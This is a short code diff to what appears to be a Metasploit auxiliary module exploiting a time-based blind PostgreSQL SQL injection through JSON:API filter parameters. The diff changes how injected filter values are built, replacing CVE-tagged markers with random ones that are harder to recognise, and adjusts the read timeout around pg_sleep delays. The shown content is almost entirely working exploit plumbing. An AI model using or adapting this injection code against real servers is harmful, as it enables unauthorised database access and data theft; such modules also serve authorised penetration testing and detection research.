@@ -60,14 +60,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def filter_vars(injection_key = nil)
-    nonce = Rex::Text.rand_text_alphanumeric(8)
+    marker = Rex::Text.rand_text_alphanumeric(8..12)
     vars = {
       'filter[sqli][condition][path]' => datastore['JSONAPI_FIELD'],
       'filter[sqli][condition][operator]' => 'IN',
-      'filter[sqli][condition][value][0]' => "CVE20269082a-#{nonce}",
-      'filter[sqli][condition][value][1]' => "CVE20269082b-#{nonce}"
+      'filter[sqli][condition][value][0]' => "#{marker}a",
+      'filter[sqli][condition][value][1]' => "#{marker}b"
     }
-    vars["filter[sqli][condition][value][#{injection_key}]"] = "CVE20269082c-#{nonce}" if injection_key
+    vars["filter[sqli][condition][value][#{injection_key}]"] = "#{marker}c" if injection_key
     vars
   end
 
@@ -80,6 +80,7 @@ class MetasploitModule < Msf::Auxiliary
     create_sqli(dbms: PostgreSQLi::TimeBasedBlind) do |payload|
       res = send_request_cgi(
         { 'method' => 'GET', 'uri' => jsonapi_uri, 'vars_get' => filter_vars(injection_key(payload)) },
+        # read timeout must outlast pg_sleep(SqliDelay) plus the round-trip
         (datastore['SqliDelay'] + 20).ceil
       )
       raise Rex::ConnectionError, 'No response to the SQL injection probe' unless res
